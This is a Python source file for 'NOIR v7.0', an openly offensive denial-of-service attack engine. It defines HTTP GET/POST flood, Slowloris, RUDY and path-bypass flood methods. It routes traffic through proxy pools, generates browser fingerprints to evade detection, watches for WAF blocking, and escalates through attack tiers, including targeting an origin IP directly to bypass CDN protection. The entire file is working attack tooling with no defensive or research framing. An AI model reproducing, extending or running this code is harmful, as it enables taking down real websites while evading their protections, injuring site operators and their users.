"""
NOIR v7.0 - Core Attack Engine v7.0
Integrated with WAF Detection, Browser Fingerprint, and Advanced Features
"""
import asyncio
import time
import random
import logging
from typing import Optional, Callable
from dataclasses import dataclass, field
from enum import Enum

# Import v7.0 modules
try:
    from core.waf.detector import WAFDetector, WAFType, BlockReason, waf_detector
    from core.browser.fingerprint import BrowserFingerprint, generate_fingerprint
    V7_FEATURES_AVAILABLE = True
except ImportError:
    V7_FEATURES_AVAILABLE = False

from core.proxy_engine import ProxyPool
from core.tier_engine import TierAttack, TierMetrics

logger = logging.getLogger("attack_engine")


class AttackMethod(Enum):
    """Attack method types"""
    HTTP_GET_FLOOD = "http_get_flood"
    HTTP_POST_FLOOD = "http_post_flood"
    BYPASS_PATH_FLOOD = "bypass_path_flood"
    SLOWLORIS = "slowloris"
    RUDY = "rudy"


@dataclass
class AttackMetrics:
    """Real-time attack metrics"""
    completed: int = 0
    failed: int = 0
    timeout: int = 0
    total_requests: int = 0
    current_rps: float = 0.0
    peak_rps: float = 0.0
    avg_response_time_ms: float = 0.0
    active_proxies: int = 0
    attack_method: str = "http_get_flood"
    tier: int = 1
    status: str = "STOPPED"
    
    # v7.0 new fields
    blocked_requests: int = 0
    waf_detected: bool = False
    waf_type: str = "none"
    block_rate: float = 0.0
    fingerprint_id: str = ""

    def to_dict(self) -> dict:
        base = {
            "completed": self.completed,
            "failed": self.failed,
            "timeout": self.timeout,
            "total_requests": self.total_requests,
            "current_rps": round(self.current_rps, 1),
            "peak_rps": round(self.peak_rps, 1),
            "avg_response_time_ms": round(self.avg_response_time_ms, 1),
            "active_proxies": self.active_proxies,
            "attack_method": self.attack_method,
            "tier": self.tier,
            "status": self.status,
            # v7.0 fields
            "blocked_requests": self.blocked_requests,
            "waf_detected": self.waf_detected,
            "waf_type": self.waf_type,
            "block_rate": round(self.block_rate, 2),
            "fingerprint_id": self.fingerprint_id,
        }
        return base


class AttackEngine:
    """Enhanced Attack Engine with v7.0 Features"""
    
    def __init__(self, proxy_pool: Optional[ProxyPool] = None, no_proxy: bool = False,
                 origin_ip: Optional[str] = None, proxy_type: str = "mobile",
                 initial_rps: int = 100, start_tier: int = 1,
                 attack_plan: Optional[list] = None, enable_v7: bool = True):
        self.proxy_pool = proxy_pool
        self.no_proxy = no_proxy
        self.origin_ip = origin_ip
        self.proxy_type = proxy_type
        self.initial_rps = initial_rps
        self.start_tier = start_tier
        self.attack_plan = attack_plan
        self.metrics = AttackMetrics()
        self._on_metrics: Optional[Callable] = None
        
        # v7.0 features
        self.enable_v7 = enable_v7 and V7_FEATURES_AVAILABLE
        self.waf_detector = waf_detector if V7_FEATURES_AVAILABLE else None
        self.fingerprint: Optional[BrowserFingerprint] = None
        self._block_count = 0
        
    def set_metrics_callback(self, cb: Callable):
        self._on_metrics = cb

    def _metrics_bridge(self, tm: TierMetrics):
        self.metrics.completed = tm.completed
        self.metrics.failed = tm.failed
        self.metrics.timeout = tm.timeout
        self.metrics.total_requests = tm.total
        self.metrics.current_rps = tm.rps
        self.metrics.peak_rps = tm.peak_rps
        self.metrics.avg_response_time_ms = tm.avg_rtt
        self.metrics.tier = tm.tier
        self.metrics.active_proxies = self.proxy_pool.stats()["total"] if self.proxy_pool else 0
        self.metrics.status = tm.status.upper()
        
        # Update v7 metrics
        if self.fingerprint:
            self.metrics.fingerprint_id = self.fingerprint.instance_id[:8]
        
        if self._on_metrics:
            self._on_metrics(self.metrics.to_dict())

    def _update_waf_status(self, response_status: int, response_headers: dict, response_body: str):
        """Update WAF detection status"""
        if not self.waf_detector:
            return
            
        result = self.waf_detector.detect(response_status, response_headers, response_body)
        
        if result.detected:
            self.metrics.waf_detected = True
            self.metrics.waf_type = result.waf_type.value
            
        if result.is_blocking:
            self._block_count += 1
            self.metrics.blocked_requests = self._block_count
            
        if self.metrics.total_requests > 0:
            self.metrics.block_rate = self._block_count / self.metrics.total_requests

    async def start_attack(self, url: str, duration: int, method: str = "http_get_flood", rps: int = 100):
        """Start attack with v7.0 features"""
        self.metrics = AttackMetrics()
        self.metrics.attack_method = method
        
        # Generate fingerprint if v7 enabled
        if self.enable_v7:
            self.fingerprint = generate_fingerprint()
            logger.info(f"Generated browser fingerprint: {self.fingerprint.instance_id[:8]}")
        
        # Build tier attack
        ta = TierAttack(
            proxy_pool=self.proxy_pool,
            target_url=url,
            origin_ip=self.origin_ip,
            proxy_type=self.proxy_type,
            on_metrics=self._metrics_bridge,
            attack_plan=self.attack_plan,
        )
        
        if not self.no_proxy:
            logger.info("Warming up session...")
            await ta.warmup(url)
        
        tier = 3 if self.origin_ip else (1 if self.no_proxy else self.start_tier)
        logger.info("Starting attack at Tier %d -> %s (%ds, %d RPS)", tier, url, duration, rps)
        
        result = await ta.run_escalation(url, start_tier=tier, duration=duration, rps=rps)
        
        self.metrics.status = "STOPPED"
        if self._on_metrics:
            self._on_metrics(self.metrics.to_dict())
            
        logger.info("Attack complete: %d req, %d OK, %d FAIL, %d TO",
                    result.total, result.completed, result.failed, result.timeout)

    def stop(self):
        """Stop attack"""
        pass

    def get_metrics(self) -> dict:
        """Get current metrics"""
        return self.metrics.to_dict()
